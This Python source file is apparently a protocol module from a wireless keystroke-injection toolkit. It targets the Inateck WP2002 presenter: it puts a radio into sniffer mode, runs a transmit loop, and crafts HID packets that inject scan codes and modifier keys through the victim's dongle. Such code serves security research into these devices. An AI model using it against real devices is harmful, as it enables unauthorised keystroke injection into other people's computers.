#!/usr/bin/env/python3
# -*- coding: utf-8 -*-

import time
import struct

from .protocol import Protocol
from lib import common
from collections import deque
from threading import Thread

SEND_DELAY = 0.002


class Inateck_WP2002(Protocol):
    """Inateck Wireless Presenter 2002
       Uses the same protocol as the RII rounded-pen wireless presenter
    """

    def __init__(self, address):
        """Constructor"""

        # set address
        self.address = address
        super(Inateck_WP2002, self).__init__("Inateck_WP2002")

    def configure_radio(self):
        """Configure the radio"""

        # Put the radio in sniffer mode and set sample rate to 250K
        common.radio.enter_sniffer_mode(self.address, rate=common.RF_RATE_250K)

        # Set the channels to 25 only (2.425 GHz)
        common.channels = [25]

        # Set the initial channel
        common.radio.set_channel(common.channels[0])

        # Set initial sequence number
        self.seq = 0

    def start_injection(self):
        """Enter injection mode"""

        # Build a dummy HID payload
        self.seq = 0                        # set squence number
        self.dummy_pld = b"\x00\x00\x00"    # create dummy payload

        # Start the TX loop
        self.cancel_tx_loop = False
        self.tx_queue = deque()
        self.tx_thread = Thread(target=self.tx_loop)
        self.tx_thread.daemon = True
        self.tx_thread.start()

        # Queue up 50 dummy packets for initial dongle sync
        for x in range(50):
            self.tx_queue.append(self.dummy_pld)

    def tx_loop(self):
        """TX loop"""

        while not self.cancel_tx_loop:
            # Read from the queue
            if len(self.tx_queue):

                # Transmit the queued packet a couple times
                payload = self.tx_queue.popleft()
                for x in range(2):
                    ack_timeout = 1         # set acknowledge timeout to 500 ms
                    retries = 4
                    common.radio.transmit_payload(payload, ack_timeout, retries)

            # No queue items; transmit a dummy packet
            else:
                self.tx_queue.append(self.dummy_pld)

    def stop_injection(self):
        """Leave injection mode"""

        while len(self.tx_queue):
            time.sleep(SEND_DELAY)
            continue

        self.cancel_tx_loop = True
        self.tx_thread.join()

    def send_hid_event(self, scan_code=0, modifiers=0):
        """Send a HID event"""

        # Build and queue packet payload
        payload = struct.pack("BBB", 0x40 | (self.seq & 0x0f), scan_code,
                              modifiers)
        self.tx_queue.append(payload)       # add packet to queue
        self.seq += 1                       # increase sequence number
